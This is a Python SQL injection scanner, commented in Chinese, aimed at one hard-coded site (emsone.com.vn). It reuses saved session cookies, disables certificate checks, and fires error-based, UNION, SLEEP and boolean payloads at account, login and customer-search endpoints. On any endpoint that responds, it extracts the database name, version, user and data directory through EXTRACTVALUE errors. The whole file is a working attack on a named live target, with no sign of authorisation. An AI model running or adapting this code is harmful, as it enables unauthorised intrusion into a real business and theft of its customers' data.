#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class FinalComprehensiveSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working_endpoints = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_endpoint_comprehensive(self, endpoint, param):
        """全面测试单个端点"""
        payloads = [
            ("1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--", 'EXTRACTVALUE'),
            ("1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--", 'updatexml'),
            ("1' UNION SELECT 'TEST'--", 'UNION'),
            ("1' AND SLEEP(5)--", 'SLEEP'),
            ("1' OR '1'='1", 'OR'),
        ]
        
        for payload, ptype in payloads:
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
                
                has_test = 'TEST' in r.text
                has_xpath = 'XPATH' in r.text.upper()
                has_delay = elapsed > 4
                
                if has_test or has_xpath or has_delay:
                    result = {
                        'endpoint': endpoint,
                        'param': param,
                        'payload_type': ptype,
                        'has_test': has_test,
                        'has_xpath': has_xpath,
                        'has_delay': has_delay,
                        'elapsed': elapsed
                    }
                    
                    if has_xpath:
                        match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                        if match:
                            result['extracted'] = match.group(1)
                    
                    return result
            except:
                pass
        
        return None
    
    def extract_database_from_working(self, endpoint, param):
        """从有效端点提取数据库"""
        print(f"\n[*] 提取数据库: {endpoint} [{param}]")
        
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
            ('SELECT @@version', 'MySQL版本'),
            ('SELECT @@datadir', '数据目录'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                
                # 检查所有提取模式
                patterns = [
                    r"XPATH syntax error: '~([^']+)~'",
                    r"'~([^']+)~'",
                    r"~([^~]+)~",
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, r.text, re.IGNORECASE)
                    if match:
                        value = match.group(1)
                        if value and len(value) > 0:
                            print(f"    [+] {label}: {value}")
                            self.db_info[label] = value
                            break
            except:
                pass
    
    def test_all_endpoints_comprehensive(self):
        """全面测试所有端点"""
        print("[*] 全面测试所有端点...")
        
        endpoints_config = [
            ('/Account/GetUserInfo', ['id', 'ID', 'Id', 'user_id']),
            ('/Account/JLogin', ['id', 'MobileNumber', 'Email']),
            ('/Account/Logout', ['id']),
            ('/Account/RegisterView', ['id']),
            ('/Account/Register', ['id', 'MobileNumber', 'Email']),
            ('/Handle/SearchListCustomer', ['id', 'q', 'search', 'customer_id']),
            ('/Handle/SearchListProvince', ['Type', 'id']),
            ('/Handle/SearchListWardByDistrictID', ['DistrictID', 'id']),
            ('/Handle/SearchListDistrictByProvinceID', ['ProvinceID', 'id']),
            ('/Handle/SearchListWareHouse', ['id']),
            ('/Handle/SearchListProductVariantByWareHouseID', ['WareHouseID', 'id']),
            ('/Handle/SearchListFunctionalByGroupPermissionID', ['GroupPermissionID', 'id']),
            ('/Handle/TransportPostageCharged', ['id']),
        ]
        
        working = []
        for endpoint, params in endpoints_config:
            for param in params:
                result = self.test_endpoint_comprehensive(endpoint, param)
                if result:
                    print(f"    [!] {endpoint} [{param}] - {result['payload_type']}")
                    if result.get('extracted'):
                        print(f"        [+] 提取: {result['extracted']}")
                    working.append(result)
        
        return working
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("最终全面SQL注入扫描")
        print("="*60)
        
        working = self.test_all_endpoints_comprehensive()
        
        # 从有效端点提取数据库
        for result in working:
            if result.get('has_xpath'):
                self.extract_database_from_working(result['endpoint'], result['param'])
        
        # 保存结果
        with open('final_comprehensive_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'working_endpoints': working,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("最终结果")
        print("="*60)
        print(f"有效注入点: {len(working)}")
        print(f"数据库信息: {len(self.db_info)}")
        for k, v in self.db_info.items():
            print(f"  {k}: {v}")

if __name__ == "__main__":
    scanner = FinalComprehensiveSQLi()
    scanner.run_all()